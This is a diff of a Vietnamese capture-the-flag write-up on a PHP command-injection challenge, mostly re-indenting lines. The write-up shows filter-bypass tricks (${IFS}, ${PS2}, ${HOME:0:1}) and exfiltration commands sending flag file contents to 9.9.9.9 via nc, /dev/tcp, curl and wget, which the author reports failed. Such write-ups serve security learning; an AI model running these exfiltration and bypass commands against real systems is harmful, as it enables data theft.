@@ -8,7 +8,7 @@ Author: yakuhito
 # Solution
 
 - Đầu tiên, sau khi kết nối đến địa chỉ đề cho, chúng ta có thể thấy được ngay source code của file [index.php](problem/index.php).
-<img src=assets/p1.png>
+	<img src=assets/p1.png>
 
 - Sau khi đọc code, ta có thể thấy ngay yêu cầu của challenge này như sau:
 	- Nhận 1 tham số có tên là `flag` thông qua phương thức `GET`.
@@ -31,10 +31,10 @@ Author: yakuhito
 	- Ở đây vì hàm **checkFlag** chỉ cho phép nhập 7 kí tự đặc biệt này `-{_\$.}`.
 nên giải pháp sẽ là thay kí tự `space` bằng `${IFS}`.
 	- Tiếp theo đến đoạn kết nối ra internet thì chúng ta có thể dùng `nc 9.9.9.9 9999`, tuy nhiên kí tự `|` lại không cho được phép. Sau 1 hồi search google thì phát hiện cách này: **cat flag > /dev/tcp/9.9.9.9/9999**, trong đó kí tự ">" sẽ được thay bằng biến môi trường `${PS2}`, kí tự `/` tuy không được phép nhưng có thể thay bằng `${HOME}` (hoặc **${HOME:0:1}**), tuy nhiên cách này cũng fail vì kí tự `>` từ biến môi trường `${PS2}` được xem như là 1 file chứ không phải là kí tự `redirect`. Đến đây chúng ta fail ở việc kết nối 2 command lại với nhau. Vậy thử dụng 1 command kiểu như là:
-```sh
-curl 9.9.9.9/`cat flag.php`
-wget 9.9.9.9/$(base64 flag.php)
-```
+		```sh
+		curl 9.9.9.9/`cat flag.php`
+		wget 9.9.9.9/$(base64 flag.php)
+		```
 	- Nhưng cũng đều fail nốt vì 2 kí tự "(" và "\`" đều bị filter hết. Thật ra với cách này mình fail ngay từ đầu vì nghĩ rằng kí tự `\n` có thể làm kí tự phân cách giữa `command1` và `command2`. Nói chúng bị hàm **checkFlag** lọc kí tự như thế thì đúng là khó thở thật. 
 
 - Hướng 2: Bypass hàm **checkFlag**
